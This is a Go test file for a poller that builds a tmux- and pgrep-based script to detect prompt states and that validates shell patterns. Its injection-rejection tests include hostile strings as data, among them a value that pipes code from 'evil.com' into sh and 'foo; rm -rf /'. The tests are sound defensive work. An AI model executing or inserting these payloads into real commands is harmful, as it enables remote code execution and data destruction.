package poller

import (
	"strings"
	"testing"
)

func TestParseDetectionOutput(t *testing.T) {
	tests := []struct {
		name       string
		output     string
		wantStatus string
		wantDetail string
	}{
		{"working", "WORKING", "WORKING", ""},
		{"waiting", "WAITING", "WAITING", ""},
		{"finished", "FINISHED", "FINISHED", ""},
		{"error with code", "ERROR:1", "ERROR", "1"},
		{"error with signal", "ERROR:137", "ERROR", "137"},
		{"empty output", "", "SLEEPING", ""},
		{"garbage output", "some random text", "SLEEPING", ""},
		{"working with whitespace", "  WORKING  \n", "WORKING", ""},
		{"waiting with newline", "WAITING\n", "WAITING", ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			status, detail := ParseDetectionOutput(tt.output)
			if status != tt.wantStatus {
				t.Errorf("status = %q, want %q", status, tt.wantStatus)
			}
			if detail != tt.wantDetail {
				t.Errorf("detail = %q, want %q", detail, tt.wantDetail)
			}
		})
	}
}

func TestBuildDetectionScript(t *testing.T) {
	script := BuildDetectionScript([]string{"Y/n", "y/N", "Permission"})

	if script == "" {
		t.Fatal("script should not be empty")
	}

	// Verify patterns are included
	for _, p := range []string{"Y/n", "y/N", "Permission"} {
		if !strings.Contains(script, p) {
			t.Errorf("script should contain pattern %q", p)
		}
	}

	// Verify basic structure
	for _, fragment := range []string{"pgrep -a claude", "tmux capture-pane", "WAITING", "WORKING", "FINISHED", "ERROR"} {
		if !strings.Contains(script, fragment) {
			t.Errorf("script should contain %q", fragment)
		}
	}
}

func TestBuildDetectionScript_EmptyPatterns(t *testing.T) {
	script := BuildDetectionScript([]string{})
	if script == "" {
		t.Fatal("script should not be empty even with no patterns")
	}
	// Should contain a never-match pattern
	if !strings.Contains(script, "NEVER_MATCH") {
		t.Error("empty patterns should produce never-match fallback")
	}
}

func TestShellEscapePattern(t *testing.T) {
	tests := []struct {
		name    string
		pattern string
		wantErr bool
	}{
		{"simple text", "Y/n", false},
		{"prompt chars", "Permission denied", false},
		{"regex chars", "[Yy]/[Nn]", false},
		{"shell injection", `"); curl evil.com | sh; echo ("`, true},
		{"backticks", "`whoami`", true},
		{"dollar expansion", "$(id)", true},
		{"semicolon", "foo; rm -rf /", true},
		{"newline", "foo\nbar", true},
		{"single quotes", "it's", true},
		{"double quotes", `"hello"`, true},
		{"empty", "", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := shellEscapePattern(tt.pattern)
			if (err != nil) != tt.wantErr {
				t.Errorf("shellEscapePattern(%q) error = %v, wantErr %v", tt.pattern, err, tt.wantErr)
			}
		})
	}
}

func TestBuildDetectionScript_SkipsUnsafePatterns(t *testing.T) {
	script := BuildDetectionScript([]string{
		"Y/n",
		`"); curl evil.com | sh; echo ("`,
		"Permission",
	})

	// Safe patterns should be present
	if !strings.Contains(script, "Y/n") {
		t.Error("script should contain safe pattern Y/n")
	}
	if !strings.Contains(script, "Permission") {
		t.Error("script should contain safe pattern Permission")
	}

	// Unsafe pattern should NOT be present
	if strings.Contains(script, "curl") {
		t.Error("script should not contain unsafe pattern")
	}
}
